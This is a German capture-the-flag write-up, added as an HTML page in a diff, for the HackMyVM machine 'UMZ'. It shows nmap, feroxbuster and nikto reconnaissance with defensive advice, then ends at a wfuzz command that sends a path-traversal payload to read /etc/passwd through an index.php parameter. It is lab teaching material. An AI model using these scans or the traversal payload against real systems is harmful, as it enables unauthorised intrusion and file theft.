@@ -1,1 +1,1603 @@
-﻿<html><body><h1>Test-Inhalt für UMZ - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UMZ - HackMyVM - Easy</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>UMZ - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">md5sum</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">perl</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">chmod</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+        <pre>
+192.168.2.211
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Der Befehl `arp-scan -l` wird verwendet, um alle Geräte im lokalen Netzwerk mittels ARP-Requests zu entdecken. Die Option `-l` steht für `--localnet`, was bedeutet, dass arp-scan die Netzwerkschnittstellenkonfiguration verwendet, um die zu scannenden Netzwerkadressen abzuleiten.
+Die Ausgabe von `arp-scan` wird dann durch `grep "PCS"` gefiltert. "PCS" ist oft Teil des Herstellernamens "PCS Systemtechnik GmbH", der häufig bei Oracle VirtualBox virtuellen Netzwerkkarten auftaucht. Dies hilft, virtuelle Maschinen im Netzwerk zu identifizieren.
+Schließlich extrahiert `awk '{print $1}'` die erste Spalte der gefilterten Ausgabe, welche die IP-Adresse des gefundenen Geräts ist.
+In diesem Fall wurde die IP-Adresse `192.168.2.211` als Ziel identifiziert.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dieser erste Schritt ist ein klassischer und effizienter Weg, um aktive Hosts im lokalen Netzwerk zu finden, insbesondere wenn man gezielt nach virtuellen Maschinen sucht, die möglicherweise Testumgebungen darstellen. Die Kombination der Tools ist sehr effektiv: `arp-scan` für die Entdeckung, `grep` für die spezifische Filterung nach einem bekannten Herstellermuster und `awk` für die saubere Extraktion der IP-Adresse. Das Ergebnis liefert uns direkt die IP unseres Ziels.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Diese Methode ist gut für die initiale Host-Discovery in LAN-Umgebungen. Es ist immer ratsam, mehrere Discovery-Techniken zu kombinieren (z.B. auch Ping-Sweeps mit Nmap oder Netdiscover), um sicherzustellen, dass keine Hosts übersehen werden, insbesondere wenn ARP-Filterung oder andere Abwehrmaßnahmen aktiv sein könnten.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Obwohl ARP-Scans im LAN schwer zu unterbinden sind, da ARP ein fundamentales Protokoll ist, können Intrusion Detection Systeme (IDS) so konfiguriert werden, dass sie auf eine ungewöhnlich hohe Anzahl von ARP-Requests von einer einzelnen Quelle aufmerksam machen. Eine klare Netzwerksegmentierung und das Wissen über die im Netzwerk befindlichen Geräte (Asset Management) helfen, ungewöhnliche Aktivitäten schneller zu erkennen.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -A -O 192.168.2.211</span></div>
+        <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 15:12 CEST
+Nmap scan report for Umz (192.168.2.211)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Debian))</span>
+|_http-title: cyber fortress 9000
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: <span class="command">08:00:27:6D:67:52 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.19</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms Umz (192.168.2.211)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Hier führe ich einen umfassenden Nmap-Scan gegen das zuvor identifizierte Ziel `192.168.2.211` durch.
+Die Optionen bedeuten im Einzelnen:
+- `-sS`: Führt einen TCP SYN-Scan (Stealth Scan) durch, der oft weniger auffällig ist als ein voller TCP-Connect-Scan.
+- `-sC`: Führt die Standard-Nmap-Skripte (NSE - Nmap Scripting Engine) gegen die gefundenen offenen Ports aus, um zusätzliche Informationen zu sammeln und bekannte Schwachstellen zu prüfen.
+- `-sV`: Versucht, die Versionen der laufenden Dienste auf den offenen Ports zu ermitteln.
+- `-p-`: Scannt alle 65535 TCP-Ports.
+- `-T5`: Setzt das Timing-Template auf "insane" (sehr aggressiv und schnell). Dies kann auf instabilen Netzwerken oder gegen Systeme mit Intrusion Prevention Systems (IPS) zu Problemen führen, ist aber in einer Testumgebung oft akzeptabel für schnellere Ergebnisse.
+- `-A`: Aktiviert die Betriebssystemerkennung (`-O`), Versionserkennung (`-sV`), Skript-Scanning (`-sC`) und Traceroute. Die Option `-O` ist hier redundant, da `-A` sie bereits beinhaltet.
+- `-O`: Versucht, das Betriebssystem des Ziels zu identifizieren.
+
+Die Ausgabe zeigt zwei offene TCP-Ports:
+- Port `22` (SSH): Läuft mit OpenSSH 8.4p1 Debian. Die Host-Keys werden ebenfalls angezeigt.
+- Port `80` (HTTP): Läuft mit Apache httpd 2.4.62 (Debian). Der Titel der Webseite ist "cyber fortress 9000".
+
+Zusätzlich bestätigt Nmap die MAC-Adresse (PCS Systemtechnik, Oracle VirtualBox), schätzt das Betriebssystem auf Linux (Kernel 4.x/5.x) und gibt Details zur Betriebssystemerkennung aus. Der Traceroute zeigt, dass das Ziel direkt erreichbar ist (1 Hop).
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der Nmap-Scan liefert uns wertvolle Informationen über das Zielsystem. Wir wissen nun, dass ein SSH-Dienst und ein Webserver laufen. Die Versionsinformationen (OpenSSH 8.4p1, Apache 2.4.62) sind wichtig für die spätere Suche nach bekannten Schwachstellen. Die OS-Erkennung bestätigt, dass es sich um ein Linux-System handelt. Der `-T5` Parameter ist in einem CTF-Szenario oder einer kontrollierten Umgebung für schnelle Ergebnisse legitim, in einem echten Penetrationstest bei einem Kunden würde man eher vorsichtigere Timing-Optionen (`-T3` oder `-T4`) wählen, um das Netzwerk nicht zu überlasten oder Alarme auszulösen. Die redundante Option `-O` neben `-A` hat keinen negativen Effekt, zeigt aber, dass man sich der Komponenten von `-A` bewusst sein sollte.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Die gefundenen offenen Ports (SSH und HTTP) sind die primären Angriffsvektoren. Der nächste Schritt sollte die genauere Untersuchung des Webservers auf Port 80 sein. Für den SSH-Port könnte man später versuchen, Standard-Anmeldeinformationen zu testen oder nach Benutzernamen zu suchen, die möglicherweise durch andere Mittel aufgedeckt werden. Es ist auch gut, die spezifischen Versionen von OpenSSH und Apache gegen bekannte Schwachstellendatenbanken (z.B. Exploit-DB, CVE Details) zu prüfen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass nur notwendige Ports offen sind. Für SSH: Verwenden Sie Key-basierte Authentifizierung anstelle von Passwörtern, deaktivieren Sie den Root-Login und verwenden Sie Fail2Ban, um Brute-Force-Versuche zu blockieren. Für den Webserver: Halten Sie die Software (Apache, PHP etc.) stets aktuell, um bekannte Schwachstellen zu vermeiden. Konfigurieren Sie Sicherheitsheader (wie X-Frame-Options, X-Content-Type-Options, Content-Security-Policy etc.), um die Sicherheit der Webanwendung zu erhöhen. Das Leaken von Server-Versionen im HTTP-Header sollte minimiert werden (`ServerTokens Prod` in der Apache-Konfiguration).
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+Technologies
+ 
+ 
+Web Server
+Apache HTTP Server 2.4.62
+
+Programmiersprache
+PHP
+
+Betriebssysteme
+Debian
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Dieser Abschnitt scheint eine manuelle Zusammenfassung oder eine Ausgabe eines Web-Analyse-Tools (wie Wappalyzer oder ähnlichen Browser-Plugins) zu sein, die die auf dem Webserver (Port 80 von 192.168.2.211) erkannten Technologien auflistet.
+Es wird bestätigt:
+- **Web Server:** Apache HTTP Server 2.4.62 (was mit der Nmap-Ausgabe übereinstimmt).
+- **Programmiersprache:** PHP (dies ist eine neue Information, die Nmap nicht direkt geliefert hat, aber oft bei Apache-Servern verwendet wird).
+- **Betriebssysteme:** Debian (stimmt ebenfalls mit der Nmap-Analyse überein).
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Diese Zusammenfassung ist nützlich, um die gesammelten Informationen zu konsolidieren. Die explizite Nennung von PHP als Programmiersprache ist ein wichtiger Hinweis, da dies die Art der Webanwendung und potenzielle Schwachstellen (z.B. Code-Injection in PHP, unsichere Dateihandhabung) beeinflusst. Es ist gut, solche Technologie-Fingerprints zu sammeln, um die Angriffsfläche besser zu verstehen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Mit dem Wissen, dass PHP verwendet wird, sollten Tests spezifisch auf PHP-Schwachstellen ausgerichtet werden. Dazu gehören die Suche nach Local File Inclusion (LFI), Remote File Inclusion (RFI), Command Injection, SQL-Injection (falls Datenbanken involviert sind) und unsichere PHP-Konfigurationen. Die Versionsnummer von PHP (falls ermittelbar) wäre ebenfalls sehr nützlich.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Wenn PHP verwendet wird, stellen Sie sicher, dass es auf der neuesten stabilen Version läuft und sicher konfiguriert ist (z.B. `display_errors` auf `Off` in Produktionsumgebungen, `allow_url_fopen` und `allow_url_include` auf `Off`, wenn nicht zwingend benötigt, sichere Session-Handhabung). Überprüfen Sie den PHP-Code regelmäßig auf Schwachstellen (SAST/DAST-Tools).
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+http://192.168.2.211/index.html
+
+    <!-- do you feel lucky, punk? -->
+  😈 your ddos means nothing 😈
+ 😏 go ahead, make our day
+  <!-- we eat ddos for breakfast -->
+       
+
+
+🔥 live attack counter: ∞ blocked
+😈 your ddos means nothing 😈
+⚠️ warning: we want your ddos attacks
+
+🛡️ try all you want
+
+💣 our backups are already online
+
+⚡ your attacks feed our defense ai
+😏 go ahead, make our day
+
+we dare you: hit us with your best shot
+🚫 not scared 🚫 bring it on 🚫 not scared 🚫
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Hier wird der Quellcode oder der angezeigte Inhalt der Seite `http://192.168.2.211/index.html` betrachtet. Der Inhalt besteht hauptsächlich aus herausfordernden und spöttischen Kommentaren und Texten, die sich auf DDoS-Angriffe beziehen. Es werden Emojis und Phrasen wie "your ddos means nothing", "we eat ddos for breakfast", "live attack counter: ∞ blocked" und "we dare you: hit us with your best shot" verwendet. Die HTML-Kommentare `<!-- do you feel lucky, punk? -->` und `<!-- we eat ddos for breakfast -->` sind ebenfalls sichtbar.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der Inhalt dieser HTML-Seite scheint primär dazu zu dienen, eine Art "Festung"-Image zu vermitteln und Angreifer herauszufordern. Technisch gesehen liefert diese Seite auf den ersten Blick keine direkten Hinweise auf Schwachstellen. Die HTML-Kommentare sind eher humoristisch als informativ. Es ist jedoch immer gut, den Quellcode von Webseiten zu untersuchen, da manchmal versteckte Informationen oder Hinweise auf weitere Funktionalitäten oder Endpunkte enthalten sein können. In diesem Fall scheint es sich mehr um "Flavor Text" zu handeln.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Obwohl diese Seite keine offensichtlichen Schwachstellen zeigt, sollte man den Quellcode immer sorgfältig prüfen (z.B. nach versteckten Links, JavaScript-Code, der interessante Endpunkte aufruft, oder weiteren Kommentaren). Manchmal können solche herausfordernden Texte auch auf eine bewusste Honeypot-Komponente oder ein spezifisches Verteidigungssystem hindeuten, das man im Hinterkopf behalten sollte.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Aus Sicherheitssicht ist der Inhalt dieser Seite unkritisch. Es ist jedoch generell ratsam, in HTML-Kommentaren keine sensiblen Informationen preiszugeben (was hier nicht der Fall ist). Der Fokus sollte auf der Sicherheit der tatsächlichen Webanwendungslogik und des Servers liegen, nicht auf dem statischen Text einer Seite.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+http://192.168.2.211/index.php
+
+⚠️ DDoS Protection Active: This service is protected by automated anti-DDoS measures. Excessive requests will trigger security protocols.
+Resource Stress Test Interface
+Service Status Monitor
+
+🟢 System Operational - Health Check Identifier: HEALTHY_STRING
+Prime Number Generation
+
+Successfully generated prime numbers up to 10000
+
+Total primes calculated: 1229
+Security Notice
+
+This diagnostic interface is protected by multiple security layers:
+
+    Automated traffic analysis
+    Request rate limiting
+    Connection fingerprinting
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Dies ist der Inhalt, der von der Seite `http://192.168.2.211/index.php` geladen wird. Die Seite präsentiert sich als "Resource Stress Test Interface" und "Service Status Monitor".
+Wichtige Punkte aus dem Inhalt:
+- **DDoS Protection Active:** Ein Hinweis auf aktive Schutzmaßnahmen.
+- **System Operational:** Zeigt einen positiven Systemstatus mit dem Identifier `HEALTHY_STRING`.
+- **Prime Number Generation:** Eine Funktion zur Generierung von Primzahlen wird erwähnt, mit einem Beispielergebnis ("Successfully generated prime numbers up to 10000", "Total primes calculated: 1229").
+- **Security Notice:** Listet angebliche Sicherheitsmaßnahmen auf: "Automated traffic analysis", "Request rate limiting", "Connection fingerprinting".
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die `index.php` Seite ist deutlich interessanter als die `index.html`. Die Erwähnung eines "Resource Stress Test Interface" und einer "Prime Number Generation" deutet auf eine dynamische Funktionalität hin, die potenziell Parameter entgegennimmt. Solche Schnittstellen sind oft anfällig für verschiedene Arten von Injection-Angriffen oder Logikfehlern, wenn die Benutzereingaben nicht korrekt validiert und verarbeitet werden. Die aufgelisteten Sicherheitsmaßnahmen könnten echt sein, aber auch nur zur Abschreckung dienen. Die Primzahlgenerierung könnte ein Hinweis auf einen rechenintensiven Prozess sein, der möglicherweise als Eingabepunkt für Tests dient.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Diese Seite muss genauer untersucht werden. Gibt es Eingabefelder oder URL-Parameter, die mit der "Prime Number Generation" oder dem "Stress Test Interface" interagieren? Versuchen Sie, Parameter zu identifizieren (z.B. durch Burp Suite oder manuelle Tests mit GET/POST-Requests). Untersuchen Sie, wie die Primzahlgenerierung funktioniert – nimmt sie einen `limit`-Parameter entgegen? Könnte dies ein Angriffspunkt für Denial-of-Service durch Überlastung oder für die Injektion von Befehlen sein, wenn die Eingabe unsachgemäß behandelt wird?
+<br>
+<strong>Empfehlung (Admin):</strong>
+Wenn ein solches Diagnose- oder Testinterface öffentlich erreichbar ist, muss es extrem gut abgesichert sein. Jede Benutzereingabe muss serverseitig strikt validiert und bereinigt werden. Implementieren Sie robuste Rate-Limits und überwachen Sie die Nutzung solcher Schnittstellen genau. Wenn möglich, sollten solche Interfaces nur aus vertrauenswürdigen Netzwerken erreichbar sein oder durch starke Authentifizierung geschützt werden. Stellen Sie sicher, dass die "Sicherheitsmaßnahmen" nicht nur Behauptungen sind, sondern tatsächlich implementiert und wirksam sind.
+</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://192.168.2.211" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+        <pre>
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.2.211
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET       76l      307w     3024c http://192.168.2.211/</span>
+<span class="command">200      GET       93l      201w     2714c http://192.168.2.211/index.php</span>
+<span class="command">200      GET       76l      307w     3024c http://192.168.2.211/index.html</span>
+[###########>--------] - 6m   3529416/6175260 4m      found:3       errors:0      
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_2_211-1748956780.state ...
+[###########>--------] - 6m   3529574/6175260 4m      found:3       errors:0      
+[###########>--------] - 6m   3528784/6175260 10240/s http://192.168.2.211/
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich setze `feroxbuster` ein, ein schnelles Tool zur Verzeichnis- und Datei-Enumeration auf Webservern.
+Die verwendeten Optionen sind:
+- `--url "http://192.168.2.211"`: Definiert das Ziel.
+- `--wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: Verwendet eine mittelgroße, gängige Wortliste für die Brute-Force-Suche nach Verzeichnissen und Dateien.
+- `-x .git,.php,.html,...`: Eine lange Liste von Dateiendungen, nach denen zusätzlich gesucht werden soll (z.B. `index.php.bak`, `config.txt`).
+- `-s 200 301 302`: Zeigt nur Ergebnisse mit diesen HTTP-Statuscodes an (OK, Moved Permanently, Found).
+- Die Standardeinstellungen für Threads (50), Timeout (7s) etc. werden verwendet.
+
+Die Ausgabe zeigt, dass `feroxbuster` die bereits bekannten Dateien `/`, `/index.php` und `/index.html` gefunden hat. Der Scan wurde nach 6 Minuten manuell mit `Strg+C` abgebrochen (`Caught ctrl+c`). Zu diesem Zeitpunkt wurden ca. 3,5 Millionen von 6,1 Millionen Requests abgearbeitet, ohne weitere Funde.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Verwendung von `feroxbuster` mit einer guten Wortliste und relevanten Dateiendungen ist ein wichtiger Schritt in der Web-Enumeration. Obwohl in diesem Fall keine neuen, versteckten Ressourcen aufgedeckt wurden, bevor der Scan abgebrochen wurde, ist der Prozess selbst korrekt. Das manuelle Abbrechen eines Scans ist in CTFs üblich, wenn man den Eindruck hat, dass keine weiteren nützlichen Informationen in absehbarer Zeit gefunden werden oder man andere Angriffsvektoren verfolgen möchte. Die hohe Anzahl an Requests zeigt das Potenzial solcher Tools, aber auch die Notwendigkeit, sie gezielt einzusetzen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Wenn ein Directory Brute-Forcing keine neuen Ergebnisse liefert, sollte man andere Enumerationstechniken in Betracht ziehen oder sich auf die bereits bekannten Applikationspfade konzentrieren. Es ist auch möglich, kleinere, spezifischere Wortlisten zu verwenden, die auf die vermutete Technologie (z.B. PHP) zugeschnitten sind, oder die Rekursionstiefe anzupassen. Manchmal können auch andere HTTP-Methoden (z.B. POST, PUT) interessante Ergebnisse liefern, falls der Server diese ungewöhnlich behandelt. Das Speichern und spätere Fortsetzen des Scan-Status (`ferox-http_192_168_2_211-1748956780.state`) ist eine nützliche Funktion von feroxbuster.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Minimieren Sie die Angriffsfläche, indem Sie unnötige Dateien und Verzeichnisse vom Webserver entfernen. Verwenden Sie aussagekräftige, aber nicht zu generische Namen für administrative Schnittstellen oder sensible Bereiche, um Brute-Force-Angriffe zu erschweren. Implementieren Sie Rate-Limiting und Intrusion Detection/Prevention Systeme, um automatisierte Scans wie die von `feroxbuster` zu erkennen und zu blockieren. Überwachen Sie Server-Logs auf eine hohe Anzahl von 404-Fehlern, die auf solche Enumerationsversuche hindeuten können.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://192.168.2.211</span></div>
+        <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.211
++ Target Hostname:    192.168.2.211
++ Target Port:        80
++ Start Time:         2025-06-03 15:20:58 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.62 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">Multiple index files found: /index.php, /index.html.</span>
++ /: <span class="password">Server may leak inodes via ETags, header found with file /, inode: bd0, size: 6343c8bc64016, mtime: gzip.</span> See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: <span class="command">Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .</span>
++ 8103 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2025-06-03 15:21:32 (GMT2) (34 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich verwende `nikto`, einen bekannten Webserver-Scanner, um nach häufigen Schwachstellen und Konfigurationsfehlern auf dem Ziel `http://192.168.2.211` zu suchen.
+Die Option `-h` (oder `--host`) spezifiziert das Ziel.
+
+Die Ergebnisse von Nikto sind:
+- Bestätigung der Server-Version: `Apache/2.4.62 (Debian)`.
+- Fehlender `X-Frame-Options`-Header: Dies kann die Seite anfällig für Clickjacking-Angriffe machen.
+- Fehlender `X-Content-Type-Options`-Header: Kann dazu führen, dass Browser versuchen, den Inhaltstyp zu erraten (MIME-Sniffing), was unter Umständen zu Sicherheitsproblemen führen kann (z.B. Ausführung von Skripten in vermeintlich harmlosen Dateien).
+- Keine CGI-Verzeichnisse gefunden (Standard-Check).
+- Mehrere Index-Dateien gefunden (`/index.php`, `/index.html`): Dies ist keine direkte Schwachstelle, kann aber manchmal zu Verwirrung oder unerwartetem Verhalten führen, je nachdem, welche Datei der Server priorisiert.
+- Mögliches Leaken von Inodes via ETags: Eine ältere Schwachstelle (CVE-2003-1418), die es unter bestimmten Umständen ermöglichen könnte, Informationen über Dateien auf dem Server zu sammeln.
+- Erlaubte HTTP-Methoden: `HEAD, GET, POST, OPTIONS`. Dies ist eine Standardkonfiguration.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Nikto hat einige wichtige Konfigurationshinweise und potenzielle Schwachstellen aufgedeckt. Das Fehlen der HTTP-Sicherheitsheader `X-Frame-Options` und `X-Content-Type-Options` sind häufige Befunde und sollten behoben werden, um die Sicherheit der Webanwendung zu erhöhen. Das ETag-Inode-Leak ist eher von geringer Kritikalität, da die Ausnutzbarkeit begrenzt ist, aber es ist dennoch ein Zeichen für eine nicht optimale Konfiguration. Die Existenz mehrerer Index-Dateien ist ein kleinerer Punkt, der aber geprüft werden sollte, um sicherzustellen, dass das gewünschte Verhalten des Webservers vorliegt.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Die fehlenden Sicherheitsheader bieten keine direkten Einstiegspunkte, sind aber gute Punkte für den Bericht. Das ETag-Leak könnte weiter untersucht werden, um festzustellen, ob tatsächlich Inodes von sensiblen Dateien offengelegt werden, obwohl dies meist nur in Kombination mit anderen Schwachstellen relevant wird. Das Vorhandensein von `index.php` neben `index.html` könnte darauf hindeuten, dass `index.php` die aktivere oder primäre Seite ist, was unsere vorherige Analyse der dynamischen Inhalte auf `index.php` stützt.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Implementieren Sie die fehlenden HTTP-Sicherheitsheader:
+- `X-Frame-Options: DENY` oder `SAMEORIGIN` (um Clickjacking zu verhindern).
+- `X-Content-Type-Options: nosniff` (um MIME-Sniffing zu verhindern).
+Überprüfen Sie die Apache-Konfiguration bezüglich der ETag-Generierung (`FileETag` Direktive) und stellen Sie sicher, dass sie keine Inodes leakt (z.B. `FileETag MTime Size` anstelle von `FileETag INode MTime Size`).
+Stellen Sie sicher, dass die `DirectoryIndex`-Direktive in der Apache-Konfiguration die gewünschte Index-Datei priorisiert und keine Verwirrung durch mehrere Index-Dateien entsteht. Deaktivieren Sie nicht benötigte HTTP-Methoden (obwohl die hier gelisteten Standard sind).
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+        <pre>
+                192.168.2.211   umz.hmv
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Hier editiere ich die lokale `/etc/hosts`-Datei auf meinem Angreifer-System. Ich füge einen Eintrag hinzu, der die IP-Adresse `192.168.2.211` dem Hostnamen `umz.hmv` zuordnet. Dies geschieht üblicherweise mit einem Texteditor wie `vi`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das Hinzufügen eines Eintrags zur `/etc/hosts`-Datei ist eine gängige Praxis während Penetrationstests. Es ermöglicht, das Zielsystem über einen Hostnamen anstelle der IP-Adresse anzusprechen. Dies ist besonders nützlich, wenn Webanwendungen oder Dienste erwarten, über einen bestimmten Hostnamen aufgerufen zu werden (z.B. aufgrund von Virtual Host Konfigurationen auf dem Server oder SSL-Zertifikaten, die an einen Hostnamen gebunden sind). Es vereinfacht auch die Befehlseingabe und die Lesbarkeit von Logs und Berichten.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Dies ist ein guter Vorbereitungsschritt. Nachdem der Eintrag gesetzt ist, sollten alle weiteren Interaktionen mit dem Ziel, insbesondere Web-Requests, über den Hostnamen `umz.hmv` erfolgen, um sicherzustellen, dass die Anwendung wie erwartet reagiert und um eventuelle vHost-spezifische Inhalte oder Konfigurationen zu entdecken.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Diese Aktion findet auf dem System des Angreifers statt und hat keine direkten Auswirkungen auf die Sicherheit des Zielsystems. Es ist jedoch ein Hinweis darauf, wie Angreifer ihre Umgebung für Tests konfigurieren.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.2.211/index.php?FUZZ=../../../../../../../etc/passwd --hc 404 --hh 2707</span></div>
+        <pre>
